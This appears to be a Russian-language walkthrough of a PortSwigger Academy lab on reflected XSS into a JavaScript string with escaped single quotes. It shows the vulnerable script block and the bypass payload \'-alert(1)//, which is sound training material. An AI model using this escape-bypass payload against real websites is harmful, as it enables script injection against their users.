введем в поиск рандомный запрос
```
0 search results for 'qwe123'
```
и посмотрим где отображается наш поисковый запрос в ответе
```
<script>
  var searchTerms = 'qwe123';
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/19.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20escaped/pics%20for%20walkthrough/1.png)
Попробуем модифицировать запрос и найдем `qwe123'test`

и увидим, что запрос экранирован дополнительной последовательностью спецсимволов - `&apos;`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/19.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20escaped/pics%20for%20walkthrough/2.png)
Попробуем обойти данную защиту, экранировав символ `'` -> `\'`
и введем в поисковую строку
```
\'-alert(1)//
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/19.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20escaped/pics%20for%20walkthrough/3.png)
и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/19.%20Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20angle%20brackets%20and%20double%20quotes%20HTML-encoded%20and%20single%20quotes%20escaped/pics%20for%20walkthrough/4.png)
